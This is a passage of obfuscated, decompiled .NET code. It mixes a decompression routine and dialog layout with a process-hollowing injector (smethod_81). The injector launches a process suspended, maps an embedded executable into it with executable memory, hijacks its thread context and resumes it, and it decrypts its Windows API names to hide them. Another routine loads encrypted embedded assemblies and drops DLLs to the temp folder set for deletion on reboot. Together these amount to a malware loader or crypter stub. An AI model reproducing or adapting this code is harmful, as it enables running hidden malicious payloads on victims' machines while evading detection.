				while (((num2 = Class42.smethod_106(class16_0.class19_0, class16_0.class17_0)) & -256) == 0)
				{
					Class42.smethod_117(class16_0.class18_0, num2);
					if (--num >= 258)
					{
						continue;
					}
					goto IL_0214;
				}
				if (num2 < 257)
				{
					if (num2 < 0)
					{
						goto IL_020c;
					}
					class16_0.class19_1 = null;
					if (TclQyZ4yUTE7ipDsBqA())
					{
					}
					switch (1)
					{
					case 6:
						break;
					case 4:
						goto IL_0141;
					case 7:
					case 11:
						goto IL_0180;
					case 10:
						goto IL_0189;
					case 3:
						goto IL_01c6;
					case 5:
						continue;
					case 1:
						class16_0.class19_0 = null;
						class16_0.int_4 = 2;
						return true;
					case 2:
					case 9:
						goto IL_020c;
					case 12:
						goto end_IL_001d;
					case 8:
						goto IL_0214;
					default:
						goto IL_0218;
					}
				}
				else
				{
					class16_0.int_6 = Class15.Class16.int_0[num2 - 257];
				}
				class16_0.int_5 = Class15.Class16.int_1[num2 - 257];
				goto case 8;
			}
			case 8:
				if (class16_0.int_5 > 0)
				{
					class16_0.int_4 = 8;
					int num3 = Class42.smethod_34(class16_0.class17_0, class16_0.int_5);
					if (num3 < 0)
					{
						goto IL_0218;
					}
					Class42.smethod_99(class16_0.class17_0, class16_0.int_5);
					class16_0.int_6 += num3;
				}
				goto IL_0141;
			case 9:
			{
				int num2 = Class42.smethod_106(class16_0.class19_1, class16_0.class17_0);
				if (num2 >= 0)
				{
					class16_0.int_7 = Class15.Class16.int_2[num2];
					class16_0.int_5 = Class15.Class16.int_3[num2];
					goto IL_0180;
				}
				return false;
			}
			case 10:
				goto IL_0180;
			default:
				continue;
				IL_01c6:
				Class42.smethod_27(class16_0.class18_0, class16_0.int_6, class16_0.int_7);
				num -= class16_0.int_6;
				class16_0.int_4 = 7;
				continue;
				IL_0141:
				class16_0.int_4 = 9;
				goto case 9;
				IL_0214:
				return true;
				IL_0180:
				if (class16_0.int_5 > 0)
				{
					goto IL_0189;
				}
				goto IL_01c6;
				IL_020c:
				return false;
				IL_0218:
				return false;
				IL_0189:
				class16_0.int_4 = 10;
				num4 = Class42.smethod_34(class16_0.class17_0, class16_0.int_5);
				if (num4 >= 0)
				{
					Class42.smethod_99(class16_0.class17_0, class16_0.int_5);
					class16_0.int_7 += num4;
					goto IL_01c6;
				}
				return false;
				end_IL_001d:
				break;
			}
			break;
		}
		return true;
	}

	static Class15.Class19 smethod_77(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_3];
		Array.Copy(class20_0.byte_1, 0, array, 0, class20_0.int_3);
		return new Class15.Class19(array);
	}

	static bool smethod_78(Class15.Class16 class16_0)
	{
		int int_ = class16_0.int_4;
		bool result = default(bool);
		int num3 = default(int);
		while (true)
		{
			int num;
			switch (int_)
			{
			case 2:
				if (!class16_0.bool_0)
				{
					int num2 = Class42.smethod_34(class16_0.class17_0, 3);
					if (num2 >= 0)
					{
						Class42.smethod_99(class16_0.class17_0, 3);
						if (((uint)num2 & (true ? 1u : 0u)) != 0)
						{
							class16_0.bool_0 = true;
						}
						switch (num2 >> 1)
						{
						case 1:
							break;
						case 0:
							Class42.smethod_25(class16_0.class17_0);
							class16_0.int_4 = 3;
							goto IL_0148;
						case 2:
							class16_0.class20_0 = new Class15.Class20();
							class16_0.int_4 = 6;
							goto IL_0148;
						default:
							goto IL_0148;
						}
						class16_0.class19_0 = Class15.Class19.class19_0;
						class16_0.class19_1 = Class15.Class19.class19_1;
						if (TclQyZ4yUTE7ipDsBqA())
						{
						}
						switch (4)
						{
						case 0:
						case 8:
							break;
						case 4:
							class16_0.int_4 = 7;
							goto IL_0148;
						case 5:
							goto IL_0148;
						case 7:
							goto IL_0168;
						case 12:
							goto IL_0183;
						case 2:
							goto IL_01ca;
						case 6:
							goto IL_0224;
						default:
							return result;
						}
						break;
					}
					return false;
				}
				class16_0.int_4 = 12;
				return false;
			case 3:
				if ((class16_0.int_8 = Class42.smethod_34(class16_0.class17_0, 16)) < 0)
				{
					goto IL_0168;
				}
				Class42.smethod_99(class16_0.class17_0, 16);
				class16_0.int_4 = 4;
				goto IL_0183;
			case 4:
				goto IL_0183;
			case 5:
				num3 = Class42.smethod_21(class16_0.class18_0, class16_0.class17_0, class16_0.int_8);
				goto IL_01ca;
			case 6:
				if (!Class42.smethod_136(class16_0.class20_0, class16_0.class17_0))
				{
					return false;
				}
				class16_0.class19_0 = Class42.smethod_77(class16_0.class20_0);
				goto IL_0224;
			case 7:
			case 8:
			case 9:
			case 10:
				return Class42.smethod_76(class16_0);
			default:
				return false;
			case 12:
				{
					return false;
				}
				IL_0148:
				return true;
				IL_0183:
				num = Class42.smethod_34(class16_0.class17_0, 16);
				if (num < 0)
				{
					return false;
				}
				Class42.smethod_99(class16_0.class17_0, 16);
				class16_0.int_4 = 5;
				goto case 5;
				IL_0224:
				class16_0.class19_1 = Class42.smethod_125(class16_0.class20_0);
				class16_0.int_4 = 7;
				goto case 7;
				IL_0168:
				return false;
				IL_01ca:
				class16_0.int_8 -= num3;
				if (class16_0.int_8 == 0)
				{
					class16_0.int_4 = 2;
					return true;
				}
				return !class16_0.class17_0.IsNeedingInput;
			}
		}
	}

	[DllImport("kernel32")]
	internal static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static void smethod_79(int int_0, Class15.Class22 class22_0)
	{
		Class42.smethod_47(class22_0.class23_2);
		while (true)
		{
			Class42.smethod_47(class22_0.class23_0);
			Class42.smethod_47(class22_0.class23_1);
			Class42.smethod_20(class22_0.class25_0, class22_0.class23_0.int_1 - 257, 5);
			Class42.smethod_20(class22_0.class25_0, class22_0.class23_1.int_1 - 1, 5);
			Class42.smethod_20(class22_0.class25_0, int_0 - 4, 4);
			while (true)
			{
				int num = 0;
				while (true)
				{
					if (num < int_0)
					{
						Class42.smethod_20(class22_0.class25_0, (int)class22_0.class23_2.byte_0[Class15.Class22.int_0[num]], 3);
						num++;
						continue;
					}
					while (true)
					{
						Class42.smethod_112(class22_0.class23_0, class22_0.class23_2);
						if (TclQyZ4yUTE7ipDsBqA())
						{
						}
						switch (6)
						{
						case 0:
						case 3:
							break;
						default:
							goto end_IL_0032;
						case 1:
							goto end_IL_0070;
						case 5:
							goto end_IL_0076;
						case 6:
							Class42.smethod_112(class22_0.class23_1, class22_0.class23_2);
							return;
						}
						continue;
						end_IL_0032:
						break;
					}
					continue;
					end_IL_0070:
					break;
				}
				continue;
				end_IL_0076:
				break;
			}
		}
	}

	static string smethod_80()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return Class14.smethod_0(4233);
		}
	}

	static bool smethod_81(string string_0, string string_1, byte[] byte_0, bool bool_0)
	{
		string text = string.Format(Class14.smethod_0(4238), string_0);
		Class5.Class6.Struct2 startupInfo = default(Class5.Class6.Struct2);
		Class5.Class6.Struct1 processInformation = default(Class5.Class6.Struct1);
		string string_2 = Class42.smethod_98(Class14.smethod_0(4247));
		string string_3 = Class42.smethod_98(Class14.smethod_0(4308));
		string string_4 = Class42.smethod_98(Class14.smethod_0(4341));
		string string_5 = Class42.smethod_98(Class14.smethod_0(4374));
		string string_6 = Class14.smethod_0(4435);
		bool result;
		checked
		{
			startupInfo.uint_0 = (uint)Marshal.SizeOf(typeof(Class5.Class6.Struct2));
			string string_7 = Class14.smethod_0(4456);
			string string_8 = Class14.smethod_0(4481);
			string string_9 = Class14.smethod_0(4510);
			string string_10 = Class14.smethod_0(4535);
			Class5.Class6.Delegate2 @delegate = Class5.Class6.smethod_0<Class5.Class6.Delegate2>(Class14.smethod_0(4560), string_10);
			Class5.Class6.Delegate1 delegate2 = Class5.Class6.smethod_0<Class5.Class6.Delegate1>(Class14.smethod_0(4569), string_9);
			Class5.Class6.Delegate3 delegate3 = Class5.Class6.smethod_0<Class5.Class6.Delegate3>(Class14.smethod_0(4560), string_8);
			Class5.Class6.Delegate4 delegate4 = Class5.Class6.smethod_0<Class5.Class6.Delegate4>(Class14.smethod_0(4569), string_7);
			Class5.Class6.Delegate5 delegate5 = Class5.Class6.smethod_0<Class5.Class6.Delegate5>(Class14.smethod_0(4569), string_6);
			Class5.Class6.Delegate6 delegate6 = Class5.Class6.smethod_0<Class5.Class6.Delegate6>(Class14.smethod_0(4560), string_3);
			Class5.Class6.Delegate0 delegate7 = Class5.Class6.smethod_0<Class5.Class6.Delegate0>(Class14.smethod_0(4569), string_4);
			Class5.Class6.Delegate7 delegate8 = Class5.Class6.smethod_0<Class5.Class6.Delegate7>(Class14.smethod_0(4569), string_5);
			Class5.Class6.Delegate8 delegate9 = Class5.Class6.smethod_0<Class5.Class6.Delegate8>(Class14.smethod_0(4569), string_2);
			try
			{
				if (!string.IsNullOrEmpty(string_1))
				{
					goto IL_030f;
				}
				goto IL_0321;
				IL_0321:
				int num;
				int num2;
				int num3;
				if (delegate5(string_0, text, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
				{
					Conversion.Int((object)false);
					num = BitConverter.ToInt32(byte_0, 60);
					Conversion.Int((object)false);
					num2 = BitConverter.ToInt32(byte_0, num + 52);
					num3 = 13;
					if (!gW67GT4Mxy6wW4pIs8r())
					{
						goto IL_02bb;
					}
					goto IL_02c9;
				}
				throw new Exception();
				IL_02a1:
				int num4 = default(int);
				if (num4 == 0)
				{
					num3 = 2;
					if (TclQyZ4yUTE7ipDsBqA())
					{
						goto IL_01b5;
					}
					goto IL_02c9;
				}
				int bufferSize = default(int);
				int bytesRead = default(int);
				if (!delegate9(processInformation.intptr_0, num4, byte_0, bufferSize, ref bytesRead))
				{
					throw new Exception();
				}
				int num5 = num + 248;
				short num6 = BitConverter.ToInt16(byte_0, num + 6);
				int num7 = num6 - 1;
				int num8 = 0;
				goto IL_03a5;
				IL_03e6:
				int num9 = default(int);
				byte[] array = default(byte[]);
				if (!delegate9(processInformation.intptr_0, num4 + num9, array, array.Length, ref bytesRead))
				{
					throw new Exception();
				}
				goto IL_0406;
				IL_02c9:
				switch (num3)
				{
				case 13:
					break;
				case 4:
					goto IL_01c6;
				case 10:
					goto IL_0276;
				default:
					goto IL_0279;
				case 5:
					goto IL_02bb;
				case 1:
					goto IL_030f;
				case 2:
				case 7:
					throw new Exception();
				case 6:
					goto IL_0351;
				case 3:
					goto IL_03d2;
				case 8:
					goto IL_03e6;
				case 0:
				case 9:
					goto IL_0415;
				case 11:
					goto IL_045f;
				case 14:
					throw new Exception();
				}
				goto IL_01b5;
				IL_045f:
				num4 = num2;
				goto IL_0463;
				IL_01c6:
				int[] array2 = default(int[]);
				if (IntPtr.Size == 4)
				{
					if (!delegate4(processInformation.intptr_1, array2))
					{
						goto IL_0351;
					}
				}
				else if (!@delegate(processInformation.intptr_1, array2))
				{
					throw new Exception();
				}
				int num10 = array2[41];
				int buffer = default(int);
				int num11 = default(int);
				if (delegate2(processInformation.intptr_0, num10 + 8, ref buffer, 4, ref bytesRead))
				{
					if (num2 != buffer || delegate3(processInformation.intptr_0, buffer) == 0)
					{
						num11 = BitConverter.ToInt32(byte_0, num + 80);
						bufferSize = BitConverter.ToInt32(byte_0, num + 84);
						num4 = (int)delegate7(processInformation.intptr_0, num2, (uint)num11, 12288u, 64u);
						goto IL_0276;
					}
					throw new Exception();
				}
				throw new Exception();
				IL_02bb:
				array2[0] = 65538;
				goto IL_01c6;
				IL_0351:
				throw new Exception();
				IL_0406:
				num5 += 40;
				num8++;
				goto IL_03a5;
				IL_01b5:
				array2 = new int[179];
				goto IL_02bb;
				IL_03d2:
				int num12 = default(int);
				if (num12 == 0)
				{
					goto IL_0406;
				}
				array = new byte[num12 - 1 + 1];
				goto IL_0415;
				IL_0463:
				int num13 = default(int);
				array2[44] = num4 + num13;
				if (IntPtr.Size == 4)
				{
					if (!delegate8(processInformation.intptr_1, array2))
					{
						throw new Exception();
					}
				}
				else if (!Class5.Class6.NtSetContextThread(processInformation.intptr_1, array2))
				{
					throw new Exception();
				}
				Thread.Sleep(300);
				delegate6(processInformation.intptr_1);
				goto end_IL_0161;
				IL_030f:
				text = text + Class14.smethod_0(962) + string_1;
				goto IL_0321;
				IL_03a5:
				int srcOffset = default(int);
				if (num8 <= num7)
				{
					num9 = BitConverter.ToInt32(byte_0, num5 + 12);
					num12 = BitConverter.ToInt32(byte_0, num5 + 16);
					srcOffset = BitConverter.ToInt32(byte_0, num5 + 20);
					goto IL_03d2;
				}
				byte[] bytes = BitConverter.GetBytes(num4);
				if (!delegate9(processInformation.intptr_0, num10 + 8, bytes, 4, ref bytesRead))
				{
					throw new Exception();
				}
				num13 = BitConverter.ToInt32(byte_0, num + 40);
				bool flag = default(bool);
				if (flag)
				{
					goto IL_045f;
				}
				goto IL_0463;
				IL_0276:
				if (!bool_0)
				{
					goto IL_0279;
				}
				goto IL_02a1;
				IL_0279:
				if (num4 == 0)
				{
					flag = true;
					num4 = (int)delegate7(processInformation.intptr_0, 0, (uint)num11, 12288u, 64u);
				}
				goto IL_02a1;
				IL_0415:
				Buffer.BlockCopy(byte_0, srcOffset, array, 0, array.Length);
				goto IL_03e6;
				end_IL_0161:;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Process.GetProcessById((int)processInformation.uint_0)?.Kill();
				result = false;
				ProjectData.ClearProjectError();
				goto IL_04f4;
			}
			return true;
		}
		IL_04f4:
		return result;
	}

	static void smethod_82(Exception exception_0)
	{
		Class42.smethod_2(exception_0, new object[0]);
	}

	static void smethod_83(Class29 class29_0)
	{
		while (true)
		{
			EventHandler eventHandler_ = class29_0.eventHandler_0;
			if (!TclQyZ4yUTE7ipDsBqA())
			{
				switch (3)
				{
				case 0:
				case 4:
					continue;
				case 1:
				case 3:
					if (eventHandler_ == null)
					{
						return;
					}
					break;
				case 5:
					return;
				}
			}
			eventHandler_(class29_0, EventArgs.Empty);
			break;
		}
	}

	[DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long NetMessageNameDel([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	static void smethod_84(Control0 control0_0)
	{
		Class42.smethod_151(control0_0, string.Empty);
	}

	static void smethod_85(Class29 class29_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class42.smethod_43(class29_0, tempFileName);
			string path = Class42.smethod_115();
			Process.Start(Path.Combine(path, Class14.smethod_0(4582)), Class14.smethod_0(4607) + tempFileName + Class14.smethod_0(1258));
			if (class29_0.eventHandler_0 != null)
			{
				class29_0.eventHandler_0(class29_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception fatalException)
		{
			Class42.smethod_105(class29_0, new EventArgs0(fatalException));
		}
	}

	static bool smethod_86(string string_0, bool bool_0, byte[] byte_0, string string_1)
	{
		int num = 1;
		do
		{
			if (!Class42.smethod_81(string_1, string_0, byte_0, bool_0))
			{
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		while (num <= 5);
		return false;
	}

	static void smethod_87(Class15.Class18 class18_0)
	{
		int num = 0;
		class18_0.int_0 = 0;
		class18_0.int_1 = 0;
	}

	static void smethod_88(Form1 form1_0)
	{
		((Control)form1_0).SuspendLayout();
		((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_1).set_Size(new Size(100, 24));
		((Control)form1_0.button_1).set_Location(new Point(408 - ((Control)form1_0.button_1).get_Width(), 188));
		((Control)form1_0.button_1).set_TabIndex(0);
		((Control)form1_0.button_1).set_Text(Class14.smethod_0(4636));
		((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
		((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_0).set_Size(new Size(100, 24));
		((Control)form1_0.button_0).set_Location(new Point(((Control)form1_0.button_1).get_Left() - ((Control)form1_0.button_0).get_Width() - 6, 188));
		((Control)form1_0.button_0).set_TabIndex(1);
		((Control)form1_0.button_0).set_Text(Class14.smethod_0(4645));
		((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
		((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
		((Control)form1_0.control2_0).SetBounds(6, 186, 120, 32);
		form1_0.control1_0.IconState = Enum2.const_2;
		((Control)form1_0.class37_0).set_Anchor((AnchorStyles)13);
		((Control)form1_0.class37_0).set_Location(new Point(20, 72));
		((Control)form1_0.class37_0).set_Size(new Size(382, 13));
		((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)form1_0).set_ClientSize(new Size(418, 224));
		((Form)form1_0).set_ControlBox(false);
		((Control)form1_0).get_Controls().AddRange((Control[])(object)new Control[5]
		{
			form1_0.control2_0,
			(Control)form1_0.button_0,
			(Control)form1_0.button_1,
			form1_0.control1_0,
			(Control)form1_0.class37_0
		});
		((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
		((Form)form1_0).set_MaximizeBox(false);
		((Form)form1_0).set_MinimizeBox(false);
		((Form)form1_0).set_ShowInTaskbar(false);
		((Form)form1_0).set_StartPosition((FormStartPosition)1);
		((Control)form1_0).ResumeLayout(false);
	}

	static int smethod_89(Class15.Class22.Class23 class23_0)
	{
		int num = 0;
		int num2 = 0;
		int num3 = 2;
		if (!TclQyZ4yUTE7ipDsBqA())
		{
		}
		do
		{
			switch (num3)
			{
			case 0:
			case 2:
				if (num2 < class23_0.short_0.Length)
				{
					num += class23_0.short_0[num2] * class23_0.byte_0[num2];
					goto default;
				}
				goto IL_0037;
			default:
				num2++;
				goto case 0;
			case 4:
				break;
			}
			break;
			IL_0037:
			num3 = 4;
		}
		while (!TclQyZ4yUTE7ipDsBqA());
		return num;
	}

	static void smethod_90(int int_0, Class15.Class22 class22_0, bool bool_0, int int_1, byte[] byte_0)
	{
		Class42.smethod_20(class22_0.class25_0, bool_0 ? 1 : 0, 3);
		Class42.smethod_0(class22_0.class25_0);
		Class42.smethod_104(class22_0.class25_0, int_0);
		Class42.smethod_104(class22_0.class25_0, ~int_0);
		Class42.smethod_44(byte_0, int_1, class22_0.class25_0, int_0);
		Class42.smethod_36(class22_0);
	}

	static bool smethod_91(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static void smethod_92(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class42.smethod_2(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static void smethod_93(ThreadStart threadStart_0, Form0 form0_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static void smethod_94(Class15.Class22.Class23 class23_0, int[] int_0)
	{
		class23_0.byte_0 = new byte[class23_0.short_0.Length];
		int num9 = default(int);
		int num10 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		while (true)
		{
			int num = int_0.Length / 2;
			int num2 = (num + 1) / 2;
			int num3 = 0;
			while (true)
			{
				int num4 = 0;
				while (true)
				{
					if (num4 < class23_0.int_3)
					{
						class23_0.int_2[num4] = 0;
						num4++;
						continue;
					}
					int[] array = new int[num];
					array[num - 1] = 0;
					int num5 = num - 1;
					while (true)
					{
						if (num5 >= 0)
						{
							if (int_0[2 * num5 + 1] != -1)
							{
								int num6 = 6;
								if (!gW67GT4Mxy6wW4pIs8r())
								{
									goto IL_026c;
								}
								while (true)
								{
									switch (num6)
									{
									default:
										num6 = 4;
										if (gW67GT4Mxy6wW4pIs8r())
										{
											continue;
										}
										goto case 3;
									case 3:
									case 6:
									{
										int num7 = array[num5] + 1;
										if (num7 > class23_0.int_3)
										{
											num7 = class23_0.int_3;
											num3++;
										}
										array[int_0[2 * num5]] = (array[int_0[2 * num5 + 1]] = num7);
										goto IL_0113;
									}
									case 8:
										break;
									case 9:
										goto end_IL_0117;
									case 7:
										goto end_IL_0120;
									case 1:
										goto end_IL_0131;
									case 4:
										goto IL_0162;
									case 11:
										goto IL_01c8;
									case 2:
										goto IL_021c;
									case 0:
										goto IL_0222;
									case 13:
										goto IL_022a;
									case 5:
										goto IL_0261;
									case 10:
									case 12:
										goto IL_026c;
									}
									break;
								}
							}
							else
							{
								int num8 = array[num5];
								class23_0.int_2[num8 - 1]++;
							}
							class23_0.byte_0[int_0[2 * num5]] = (byte)array[num5];
							goto IL_0113;
						}
						if (num3 == 0)
						{
							return;
						}
						num9 = class23_0.int_3 - 1;
						goto IL_01c8;
						IL_021c:
						num10 = 2 * num2;
						goto IL_0222;
						IL_022a:
						if (num11 != 0)
						{
							num12 = class23_0.int_2[num11 - 1];
							goto IL_0267;
						}
						return;
						IL_0222:
						num11 = class23_0.int_3;
						goto IL_022a;
						IL_0267:
						int num13;
						while (num12 > 0)
						{
							num13 = 2 * int_0[num10++];
							if (int_0[num13 + 1] != -1)
							{
								continue;
							}
							goto IL_0253;
						}
						goto IL_026c;
						IL_0253:
						class23_0.byte_0[int_0[num13]] = (byte)num11;
						goto IL_0261;
						IL_0162:
						if (num3 > 0 && num9 < class23_0.int_3 - 1)
						{
							goto IL_0173;
						}
						if (num3 > 0)
						{
							goto IL_01c8;
						}
						class23_0.int_2[class23_0.int_3 - 1] += num3;
						class23_0.int_2[class23_0.int_3 - 2] -= num3;
						goto IL_021c;
						IL_026c:
						num11--;
						goto IL_022a;
						IL_0261:
						num12--;
						goto IL_0267;
						IL_01c8:
						while (class23_0.int_2[--num9] == 0)
						{
						}
						goto IL_0173;
						IL_0173:
						class23_0.int_2[num9]--;
						class23_0.int_2[++num9]++;
						num3 -= 1 << class23_0.int_3 - 1 - num9;
						goto IL_0162;
						IL_0113:
						num5--;
						continue;
						end_IL_0117:
						break;
					}
					continue;
					end_IL_0120:
					break;
				}
				continue;
				end_IL_0131:
				break;
			}
		}
	}

	static bool smethod_95(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		while (true)
		{
			if (num < processes.Length)
			{
				Process process = processes[num];
				if (process.ProcessName.StartsWith(string_0))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return false;
		}
		return true;
	}

	static Assembly smethod_96(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class8.Struct4 @struct = new Class8.Struct4(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezAyOWQ3ODVjLTUxZDctNDc0Yi1iNWI5LThkMjQwNWM4NTE3OX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{bbcf057a-0f85-49ce-93b8-0337e63fa07e},ezAyOWQ3ODVjLTUxZDctNDc0Yi1iNWI5LThkMjQwNWM4NTE3OX0=,[z]{bbcf057a-0f85-49ce-93b8-0337e63fa07e}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			Assembly result;
			lock (Class8.dictionary_0)
			{
				if (Class8.dictionary_0.ContainsKey(text2))
				{
					result = Class8.dictionary_0[text2];
				}
				else
				{
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
					if (manifestResourceStream == null)
					{
						goto IL_029d;
					}
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class42.smethod_49(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							while (true)
							{
								Directory.CreateDirectory(text4);
								string text5 = text4 + @struct.string_0 + ".dll";
								while (true)
								{
									if (!File.Exists(text5))
									{
										while (true)
										{
											FileStream fileStream = File.OpenWrite(text5);
											fileStream.Write(array2, 0, array2.Length);
											fileStream.Close();
											if (TclQyZ4yUTE7ipDsBqA())
											{
											}
											switch (5)
											{
											case 1:
											case 4:
												goto end_IL_01e0;
											case 3:
												goto end_IL_022d;
											case 5:
												MoveFileEx(text5, null, 4);
												MoveFileEx(text4, null, 4);
												goto IL_026b;
											case 6:
												goto IL_026b;
											}
											continue;
											end_IL_01e0:
											break;
										}
										continue;
									}
									goto IL_026b;
									IL_026b:
									assembly = Assembly.LoadFile(text5);
									goto end_IL_0238;
									continue;
									end_IL_022d:
									break;
								}
								continue;
								end_IL_0238:
								break;
							}
						}
						catch
						{
						}
					}
					Class8.dictionary_0[text2] = assembly;
					result = assembly;
				}
			}
			return result;
		}
		goto IL_029d;
		IL_029d:
		return null;
	}

	static void smethod_97(Class28 class28_0, Enum1 enum1_0)
	{
		Class42.smethod_146(class28_0, enum1_0, string.Empty);
	}

	static string smethod_98(string string_0)
	{
		string password = Class14.smethod_0(4658);
		while (true)
		{
			string s = Class14.smethod_0(4707);
			string text = Class14.smethod_0(4736);
			int iterations = 2;
			while (true)
			{
				string s2 = Class14.smethod_0(4745);
				while (true)
				{
					int num = 256;
					byte[] bytes = Encoding.ASCII.GetBytes(s2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s);
					byte[] array = Convert.FromBase64String(string_0);
					while (true)
					{
						Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes2, iterations);
						byte[] bytes3 = rfc2898DeriveBytes.GetBytes(num / 8);
						RijndaelManaged rijndaelManaged = new RijndaelManaged();
						rijndaelManaged.Mode = CipherMode.CBC;
						ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes3, bytes);
						MemoryStream memoryStream = new MemoryStream(array);
						CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
						while (true)
						{
							IL_0058:
							byte[] array2 = new byte[checked(array.Length - 1 + 1)];
							int count = cryptoStream.Read(array2, 0, array2.Length);
							memoryStream.Close();
							cryptoStream.Close();
							while (true)
							{
								string @string = Encoding.UTF8.GetString(array2, 0, count);
								if (!gW67GT4Mxy6wW4pIs8r())
								{
									break;
								}
								switch (8)
								{
								case 7:
									break;
								case 0:
								case 4:
									goto IL_0058;
								default:
									goto end_IL_0010;
								case 1:
								case 2:
									goto end_IL_0088;
								case 5:
									goto end_IL_00d3;
								case 3:
									goto end_IL_00ff;
								case 8:
									return @string;
								}
								continue;
								end_IL_0010:
								break;
							}
							break;
						}
						continue;
						end_IL_0088:
						break;
					}
					continue;
					end_IL_00d3:
					break;
				}
				continue;
				end_IL_00ff:
				break;
			}
		}
	}

	static void smethod_99(Class15.Class17 class17_0, int int_0)
	{
		class17_0.uint_0 >>= int_0;
		class17_0.int_2 -= int_0;
	}

	static void smethod_100(Class15.Class24 class24_0)
	{
		class24_0.int_0 = (class24_0.byte_0[class24_0.int_4] << 5) ^ class24_0.byte_0[class24_0.int_4 + 1];
	}

	[DllImport("kernel32.Dll")]
	internal static extern void GetSystemInfo(ref Class41.Struct16 struct16_0);

	static void smethod_101(Form0 form0_0)
	{
		//IL_0596: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a0: Expected O, but got Unknown
		while (true)
		{
			((Control)form0_0.panel_0).SuspendLayout();
			while (true)
			{
				((Control)form0_0.panel_1).SuspendLayout();
				((Control)form0_0).SuspendLayout();
				form0_0.control1_0.IconState = Enum2.const_1;
				form0_0.control1_1.IconState = Enum2.const_1;
				((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
				((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
				while (true)
				{
					((Control)form0_0.checkBox_0).set_Location(new Point(22, 98));
					((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
					while (true)
					{
						((Control)form0_0.checkBox_0).set_TabIndex(13);
						((Control)form0_0.checkBox_0).set_Text(Class14.smethod_0(4774));
						while (true)
						{
							form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_5);
							((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
							form0_0.label_0.set_FlatStyle((FlatStyle)3);
							while (true)
							{
								((Control)form0_0.label_0).set_Font(new Font(Class14.smethod_0(4835), 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
								((Control)form0_0.label_0).set_Location(new Point(20, 124));
								((Control)form0_0.label_0).set_Size(new Size(381, 16));
								((Control)form0_0.label_0).set_Text(string.Format(Class14.smethod_0(4864), Class14.smethod_0(4913)));
								while (true)
								{
									((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
